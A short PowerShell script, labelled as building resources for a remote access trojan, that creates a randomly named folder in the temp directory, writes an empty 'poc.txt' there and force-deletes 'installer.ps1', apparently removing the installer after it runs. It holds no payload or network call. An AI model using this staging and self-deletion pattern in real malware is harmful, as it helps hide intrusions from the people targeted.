# builds resource for rat
# created by: CHEPHYTY

#random string for directories

function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % { [char]$_ })
}

## variables
$wd = random_text
$path = "$env:temp\$wd"
$initial_dir = $PWD.Path

# goto temp, make working directory
mkdir $path
Set-Location $path
Set-Content -Path "poc.txt" -Value ""
Set-Location $initial_dir

# Clean up
Remove-Item -Path ".\installer.ps1" -Force
